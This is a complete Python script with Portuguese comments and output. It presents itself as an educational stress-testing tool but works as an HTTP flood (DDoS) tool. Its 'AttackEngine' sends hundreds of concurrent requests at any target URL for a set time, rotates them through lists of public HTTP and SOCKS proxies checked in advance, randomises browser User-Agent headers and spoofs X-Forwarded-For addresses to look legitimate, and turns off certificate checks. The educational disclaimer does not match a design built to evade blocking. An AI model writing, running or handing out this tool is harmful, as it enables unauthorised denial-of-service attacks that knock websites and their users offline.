#!/usr/bin/env python3
"""
Ferramenta de Teste de Estresse com Suporte a Múltiplos Proxies
Desenvolvido para fins educacionais e testes autorizados
"""

import aiohttp
import asyncio
import numpy as np
from datetime import datetime
import os
import sys
import random
import time
import argparse
from typing import List, Tuple, Optional
import signal
import ssl
import certifi

# Configurações de cores para terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Logo ASCII
LOGO = f"""
{Colors.GREEN}
╔══════════════════════════════════════════════════════════════╗
║  ███████╗ █████╗ ███╗   ███╗ ██████╗ ███████╗ ██████╗       ║
║  ██╔════╝██╔══██╗████╗ ████║██╔═══██╗██╔════╝██╔═══██╗      ║
║  █████╗  ███████║██╔████╔██║██║   ██║███████╗██║   ██║      ║
║  ██╔══╝  ██╔══██║██║╚██╔╝██║██║   ██║╚════██║██║   ██║      ║
║  ██║     ██║  ██║██║ ╚═╝ ██║╚██████╔╝███████║╚██████╔╝      ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝       ║
║                                                              ║
║  {Colors.BOLD}🔥 Ultimate Stress Testing Tool with Proxy Support 🔥{Colors.GREEN}      ║
║  {Colors.BOLD}🛡️  Developed for Educational Purposes Only 🛡️{Colors.GREEN}            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""

class ProxyManager:
    """Gerencia o carregamento e teste de proxies"""
    
    def __init__(self, proxy_file: str):
        self.proxy_file = proxy_file
        self.working_proxies: List[dict] = []  # Armazena proxy com tipo e endereço
        self.failed_proxies: List[str] = []
        self.total_proxies = 0
        self.lock = asyncio.Lock()
        
    async def load_proxies(self) -> List[dict]:
        """Carrega proxies do arquivo e retorna lista formatada"""
        try:
            with open(self.proxy_file, 'r') as f:
                lines = f.readlines()
            
            proxies = []
            proxy_types = ['http', 'socks5', 'socks4']  # Tipos de proxy suportados
            
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) == 2:
                        ip, port = parts
                        try:
                            port = int(port)
                            if 1 <= port <= 65535:
                                # Adiciona cada tipo de proxy possível
                                for proxy_type in proxy_types:
                                    proxies.append({
                                        'type': proxy_type,
                                        'ip': ip,
                                        'port': port,
                                        'url': f"{proxy_type}://{ip}:{port}"
                                    })
                        except ValueError:
                            continue
            
            self.total_proxies = len(proxies)
            print(f"{Colors.YELLOW}[*] Carregados {self.total_proxies} formatos de proxy do arquivo{Colors.RESET}")
            return proxies
            
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Arquivo {self.proxy_file} não encontrado!{Colors.RESET}")
            sys.exit(1)
        except Exception as e:
            print(f"{Colors.RED}[!] Erro ao ler arquivo: {e}{Colors.RESET}")
            sys.exit(1)
    
    async def test_single_proxy(self, proxy_info: dict, timeout: int = 10) -> Tuple[bool, Optional[dict]]:
        """Testa um proxy individual com timeout e retry"""
        
        # URLs de teste (fallback se uma falhar)
        test_urls = [
            'http://httpbin.org/ip',
            'http://api.ipify.org?format=json',
            'http://ip-api.com/json'
        ]
        
        for test_url in test_urls:
            try:
                # Cria connector baseado no tipo de proxy
                if proxy_info['type'].startswith('socks'):
                    # Para SOCKS, precisamos do aiohttp_socks
                    try:
                        from aiohttp_socks import ProxyConnector
                        connector = ProxyConnector.from_url(proxy_info['url'])
                    except ImportError:
                        print(f"{Colors.RED}[!] aiohttp_socks não instalado. Instale com: pip install aiohttp_socks{Colors.RESET}")
                        return False, None
                else:
                    # Para HTTP, usa proxy direto
                    connector = aiohttp.TCPConnector(ssl=False)
                
                # Configuração de timeout
                timeout_settings = aiohttp.ClientTimeout(
                    total=timeout,
                    connect=timeout,
                    sock_read=timeout
                )
                
                start = time.time()
                
                async with aiohttp.ClientSession(connector=connector, 
                                                timeout=timeout_settings) as session:
                    
                    # Configura proxy para HTTP/HTTPS
                    if proxy_info['type'] == 'http':
                        proxy_url = f"http://{proxy_info['ip']}:{proxy_info['port']}"
                        async with session.get(test_url, proxy=proxy_url, ssl=False) as response:
                            if response.status == 200:
                                await response.json()
                                latency = (time.time() - start) * 1000
                                proxy_info['latency'] = latency
                                return True, proxy_info
                    else:
                        # Para SOCKS, usa o connector já configurado
                        async with session.get(test_url, ssl=False) as response:
                            if response.status == 200:
                                await response.json()
                                latency = (time.time() - start) * 1000
                                proxy_info['latency'] = latency
                                return True, proxy_info
                                
            except asyncio.TimeoutError:
                continue  # Tenta próxima URL de teste
            except Exception as e:
                continue  # Tenta próxima URL de teste
        
        return False, None
    
    async def test_all_proxies(self, max_concurrent: int = 50):
        """Testa todos os proxies concorrentemente com rate limiting"""
        all_proxies = await self.load_proxies()
        
        print(f"{Colors.YELLOW}[*] Iniciando teste de {len(all_proxies)} configurações de proxy...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Isso pode levar alguns minutos...{Colors.RESET}")
        
        working = []
        failed = []
        
        # Semáforo para limitar concorrência
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def test_with_semaphore(proxy):
            async with semaphore:
                return await self.test_single_proxy(proxy)
        
        # Processa em lotes para mostrar progresso
        batch_size = 20
        total = len(all_proxies)
        
        for i in range(0, total, batch_size):
            batch = all_proxies[i:i + batch_size]
            tasks = [test_with_semaphore(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, tuple) and result[0]:
                    success, proxy_info = result
                    if proxy_info:
                        working.append(proxy_info)
                        print(f"{Colors.GREEN}[+] Proxy válido: {proxy_info['ip']}:{proxy_info['port']} "
                              f"({proxy_info['type']}) - latência: {proxy_info['latency']:.1f}ms{Colors.RESET}")
                else:
                    failed.append(proxy_info if proxy_info else "unknown")
            
            # Mostra progresso
            percent = min(100, ((i + batch_size) / total) * 100)
            print(f"{Colors.BLUE}[*] Progresso: {min(i+batch_size, total)}/{total} ({percent:.1f}%) - "
                  f"Encontrados: {len(working)}{Colors.RESET}")
            
            # Pequena pausa para não sobrecarregar
            await asyncio.sleep(0.5)
        
        # Remove duplicatas baseado em IP:PORTA:TIPO
        seen = set()
        unique_working = []
        for proxy in working:
            key = f"{proxy['ip']}:{proxy['port']}:{proxy['type']}"
            if key not in seen:
                seen.add(key)
                unique_working.append(proxy)
        
        self.working_proxies = unique_working
        self.failed_proxies = failed
        
        print(f"\n{Colors.GREEN}[✓] Teste concluído!{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] Proxies funcionando: {len(self.working_proxies)}{Colors.RESET}")
        
        if len(self.working_proxies) == 0:
            print(f"{Colors.RED}[!] Nenhum proxy válido encontrado!{Colors.RESET}")
            sys.exit(1)
        
        return self.working_proxies

class AttackEngine:
    """Motor de ataque com suporte a múltiplos proxies"""
    
    def __init__(self, target_url: str, proxies: List[dict], 
                 concurrency: int, duration: int):
        self.target_url = target_url
        self.proxies = proxies
        self.concurrency = concurrency
        self.duration = duration
        self.request_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.latencies = []
        self.status_codes = {}
        self.start_time = None
        self.is_running = True
        self.stats_lock = asyncio.Lock()
        self.proxy_failures = {}  # Contador de falhas por proxy
        
        # Configuração SSL
        self.ssl_context = ssl.create_default_context(cafile=certifi.where())
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def create_connector(self, proxy_info: dict):
        """Cria connector apropriado baseado no tipo de proxy"""
        try:
            if proxy_info['type'].startswith('socks'):
                from aiohttp_socks import ProxyConnector
                return ProxyConnector.from_url(proxy_info['url'])
            else:
                # Para HTTP/HTTPS
                return aiohttp.TCPConnector(ssl=self.ssl_context)
        except Exception as e:
            print(f"{Colors.RED}[!] Erro ao criar connector: {e}{Colors.RESET}")
            return None
    
    async def attack_worker(self, worker_id: int):
        """Trabalhador individual que faz requisições"""
        proxy_fail_count = 0
        
        while self.is_running:
            try:
                # Escolhe um proxy aleatório com base na performance
                # Proxies com menor latência têm mais chance
                if self.proxies:
                    # Ordena por latência (menor é melhor)
                    sorted_proxies = sorted(self.proxies, key=lambda x: x.get('latency', float('inf')))
                    # Pega um dos 20% melhores
                    top_proxies = sorted_proxies[:max(1, len(sorted_proxies)//5)]
                    proxy_info = random.choice(top_proxies)
                else:
                    await asyncio.sleep(0.1)
                    continue
                
                # Cria connector
                connector = await self.create_connector(proxy_info)
                if not connector:
                    continue
                
                # Configuração de timeout
                timeout = aiohttp.ClientTimeout(
                    total=15,
                    connect=10,
                    sock_read=10
                )
                
                # Headers aleatórios
                headers = {
                    'User-Agent': random.choice([
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    ]),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'pt-BR,pt;q=0.9', 'es-ES,es;q=0.9']),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                # Adiciona alguns headers aleatórios para parecer mais legítimo
                if random.random() > 0.5:
                    headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                start = time.time()
                
                async with aiohttp.ClientSession(connector=connector, 
                                                timeout=timeout) as session:
                    
                    # Faz a requisição
                    if proxy_info['type'] == 'http':
                        proxy_url = f"http://{proxy_info['ip']}:{proxy_info['port']}"
                        async with session.get(self.target_url, 
                                             headers=headers,
                                             proxy=proxy_url,
                                             ssl=self.ssl_context) as response:
                            await response.read()
                    else:
                        async with session.get(self.target_url, 
                                             headers=headers,
                                             ssl=self.ssl_context) as response:
                            await response.read()
                    
                    latency = (time.time() - start) * 1000
                    
                    # Atualiza estatísticas
                    async with self.stats_lock:
                        self.request_count += 1
                        self.success_count += 1
                        self.latencies.append(latency)
                        
                        status = response.status
                        self.status_codes[status] = self.status_codes.get(status, 0) + 1
                        
                        # Reset contador de falhas do proxy
                        proxy_key = f"{proxy_info['ip']}:{proxy_info['port']}"
                        self.proxy_failures[proxy_key] = 0
                        
                        # Log a cada 50 requisições
                        if self.request_count % 50 == 0:
                            elapsed = time.time() - self.start_time
                            rps = self.request_count / elapsed if elapsed > 0 else 0
                            print(f"{Colors.BLUE}[Worker {worker_id}] "
                                  f"Req: {self.request_count} | "
                                  f"RPS: {rps:.1f} | "
                                  f"Status: {status} | "
                                  f"Lat: {latency:.1f}ms | "
                                  f"Proxy: {proxy_info['ip']}:{proxy_info['port']}{Colors.RESET}")
                            
            except asyncio.TimeoutError:
                async with self.stats_lock:
                    self.fail_count += 1
                    if proxy_info:
                        proxy_key = f"{proxy_info['ip']}:{proxy_info['port']}"
                        self.proxy_failures[proxy_key] = self.proxy_failures.get(proxy_key, 0) + 1
                        
                        # Se proxy falhar muitas vezes, remove temporariamente
                        if self.proxy_failures[proxy_key] > 5:
                            if proxy_info in self.proxies:
                                self.proxies.remove(proxy_info)
                                print(f"{Colors.YELLOW}[!] Proxy {proxy_key} removido temporariamente (muitas falhas){Colors.RESET}")
                    
            except Exception as e:
                async with self.stats_lock:
                    self.fail_count += 1
                    error_msg = str(e)[:50]
                    if "Proxy connection refused" in error_msg or "Couldn't connect to proxy" in error_msg:
                        if proxy_info:
                            proxy_key = f"{proxy_info['ip']}:{proxy_info['port']}"
                            self.proxy_failures[proxy_key] = self.proxy_failures.get(proxy_key, 0) + 1
                            
                            if self.proxy_failures[proxy_key] > 3:
                                if proxy_info in self.proxies:
                                    self.proxies.remove(proxy_info)
                                    print(f"{Colors.YELLOW}[!] Proxy {proxy_key} removido (conexão recusada){Colors.RESET}")
                    
                    if self.fail_count % 50 == 0:
                        print(f"{Colors.RED}[Worker {worker_id}] Erro: {error_msg}{Colors.RESET}")
            
            # Pequena pausa para não sobrecarregar
            await asyncio.sleep(0.001)
    
    async def start_attack(self):
        """Inicia o ataque com múltiplos workers"""
        self.start_time = time.time()
        end_time = self.start_time + self.duration
        
        print(f"\n{Colors.YELLOW}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}🚀 INICIANDO ATAQUE{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")
        print(f"🎯 Alvo: {self.target_url}")
        print(f"📊 Workers: {self.concurrency}")
        print(f"⏱️  Duração: {self.duration} segundos")
        print(f"🌐 Proxies disponíveis: {len(self.proxies)}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}\n")
        
        # Cria workers
        workers = [self.attack_worker(i) for i in range(self.concurrency)]
        
        # Executa workers
        attack_task = asyncio.gather(*workers, return_exceptions=True)
        
        # Monitora o progresso
        try:
            last_rps_update = time.time()
            last_request_count = 0
            
            while time.time() < end_time and self.is_running:
                remaining = int(end_time - time.time())
                elapsed = int(time.time() - self.start_time)
                
                # Calcula RPS instantâneo
                now = time.time()
                time_diff = now - last_rps_update
                if time_diff >= 1:
                    async with self.stats_lock:
                        requests_diff = self.request_count - last_request_count
                        instant_rps = requests_diff / time_diff if time_diff > 0 else 0
                        last_request_count = self.request_count
                        last_rps_update = now
                        
                        success_rate = (self.success_count / self.request_count * 100 
                                      if self.request_count > 0 else 0)
                        
                        print(f"{Colors.BLUE}[Status] Tempo: {elapsed}s | "
                              f"Restante: {remaining}s | "
                              f"Requisições: {self.request_count} | "
                              f"RPS: {instant_rps:.1f} | "
                              f"Sucesso: {success_rate:.1f}% | "
                              f"Falhas: {self.fail_count} | "
                              f"Proxies ativos: {len(self.proxies)}{Colors.RESET}")
                
                await asyncio.sleep(1)
                
        except asyncio.CancelledError:
            print(f"\n{Colors.YELLOW}[!] Ataque interrompido pelo usuário{Colors.RESET}")
        finally:
            self.is_running = False
            # Aguarda workers terminarem
            try:
                await asyncio.wait_for(attack_task, timeout=5)
            except asyncio.TimeoutError:
                pass
    
    def print_final_stats(self):
        """Mostra estatísticas finais detalhadas"""
        elapsed = time.time() - self.start_time
        
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 ESTATÍSTICAS FINAIS{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")
        
        print(f"\n📈 Visão Geral:")
        print(f"   ├─ Duração total: {elapsed:.1f} segundos")
        print(f"   ├─ Requisições totais: {self.request_count}")
        print(f"   ├─ Requisições por segundo (RPS): {self.request_count/elapsed:.2f}")
        print(f"   ├─ Requisições bem-sucedidas: {self.success_count}")
        print(f"   ├─ Requisições com falha: {self.fail_count}")
        print(f"   └─ Taxa de sucesso: {(self.success_count/self.request_count*100) if self.request_count > 0 else 0:.1f}%")
        
        if self.latencies:
            print(f"\n⏱️  Latência (ms):")
            print(f"   ├─ Mínima: {min(self.latencies):.1f}")
            print(f"   ├─ Máxima: {max(self.latencies):.1f}")
            print(f"   ├─ Média: {np.mean(self.latencies):.1f}")
            print(f"   ├─ Mediana (P50): {np.median(self.latencies):.1f}")
            print(f"   ├─ P95: {np.percentile(self.latencies, 95):.1f}")
            print(f"   └─ P99: {np.percentile(self.latencies, 99):.1f}")
        
        if self.status_codes:
            print(f"\n📋 Códigos de Status HTTP:")
            for status, count in sorted(self.status_codes.items()):
                percentage = (count / self.success_count) * 100 if self.success_count > 0 else 0
                print(f"   ├─ {status}: {count} ({percentage:.1f}%)")
        
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")

class GracefulKiller:
    """Handler para interrupção graciosa"""
    def __init__(self):
        self.kill_now = False
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
    
    def exit_gracefully(self, signum, frame):
        print(f"\n{Colors.YELLOW}[!] Recebido sinal de interrupção...{Colors.RESET}")
        self.kill_now = True

async def main():
    """Função principal"""
    killer = GracefulKiller()
    
    # Mostra logo
    print(LOGO)
    
    # Configura argumentos de linha de comando
    parser = argparse.ArgumentParser(description='Ferramenta de Teste de Estresse com Proxies')
    parser.add_argument('-u', '--url', help='URL alvo (ex: https://exemplo.com)')
    parser.add_argument('-p', '--proxy-file', default='proxies.txt', 
                       help='Arquivo de proxies (padrão: proxies.txt)')
    parser.add_argument('-c', '--concurrency', type=int, default=100,
                       help='Número de conexões simultâneas (padrão: 100)')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Duração do teste em segundos (padrão: 60)')
    parser.add_argument('--no-proxy-test', action='store_true',
                       help='Pular teste de proxies (usa todos do arquivo)')
    parser.add_argument('--max-proxy-failures', type=int, default=5,
                       help='Máximo de falhas antes de remover proxy (padrão: 5)')
    
    args = parser.parse_args()
    
    # Se não forneceu URL via linha de comando, pergunta interativamente
    if not args.url:
        print(f"{Colors.YELLOW}[?] Modo interativo ativado{Colors.RESET}\n")
        
        # Valida URL
        while True:
            url = input(f"{Colors.BOLD}[?] Digite a URL alvo (ex: https://exemplo.com): {Colors.RESET}").strip()
            if url.startswith(('http://', 'https://')):
                args.url = url
                break
            print(f"{Colors.RED}[!] URL deve começar com http:// ou https://{Colors.RESET}")
        
        # Configura concurrency
        while True:
            try:
                conc = input(f"{Colors.BOLD}[?] Conexões simultâneas (10-1000, padrão 100): {Colors.RESET}").strip()
                if not conc:
                    break
                conc = int(conc)
                if 10 <= conc <= 1000:
                    args.concurrency = conc
                    break
                print(f"{Colors.RED}[!] Valor deve estar entre 10 e 1000{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}[!] Digite um número válido{Colors.RESET}")
        
        # Configura duração
        while True:
            try:
                dur = input(f"{Colors.BOLD}[?] Duração em segundos (10-3600, padrão 60): {Colors.RESET}").strip()
                if not dur:
                    break
                dur = int(dur)
                if 10 <= dur <= 3600:
                    args.duration = dur
                    break
                print(f"{Colors.RED}[!] Valor deve estar entre 10 e 3600{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}[!] Digite um número válido{Colors.RESET}")
        
        # Pergunta sobre teste de proxies
        test_proxies = input(f"{Colors.BOLD}[?] Testar proxies antes de usar? (S/n): {Colors.RESET}").strip().lower()
        if test_proxies == 'n':
            args.no_proxy_test = True
    
    print(f"\n{Colors.YELLOW}[*] Configurações finais:{Colors.RESET}")
    print(f"   ├─ URL: {args.url}")
    print(f"   ├─ Arquivo de proxies: {args.proxy_file}")
    print(f"   ├─ Conexões simultâneas: {args.concurrency}")
    print(f"   ├─ Duração: {args.duration}s")
    print(f"   ├─ Máx falhas por proxy: {args.max_proxy_failures}")
    print(f"   └─ Testar proxies: {'Não' if args.no_proxy_test else 'Sim'}")
    
    # Gerencia proxies
    proxy_manager = ProxyManager(args.proxy_file)
    
    if args.no_proxy_test:
        print(f"\n{Colors.YELLOW}[*] Pulando teste de proxies...{Colors.RESET}")
        all_proxies = await proxy_manager.load_proxies()
        working_proxies = all_proxies  # Usa todos sem testar
        print(f"{Colors.GREEN}[✓] Usando {len(working_proxies)} configurações de proxy do arquivo{Colors.RESET}")
    else:
        print(f"\n{Colors.YELLOW}[*] Iniciando teste de proxies...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Isso pode levar alguns minutos dependendo da quantidade de proxies{Colors.RESET}")
        working_proxies = await proxy_manager.test_all_proxies()
    
    if len(working_proxies) == 0:
        print(f"{Colors.RED}[!] Nenhum proxy funcionando!{Colors.RESET}")
        return
    
    # Inicia o ataque
    engine = AttackEngine(args.url, working_proxies, 
                          args.concurrency, args.duration)
    
    try:
        await engine.start_attack()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Ataque interrompido pelo usuário{Colors.RESET}")
    finally:
        engine.print_final_stats()
    
    print(f"\n{Colors.GREEN}[✓] Teste concluído!{Colors.RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Programa encerrado pelo usuário{Colors.RESET}")
        sys.exit(0)
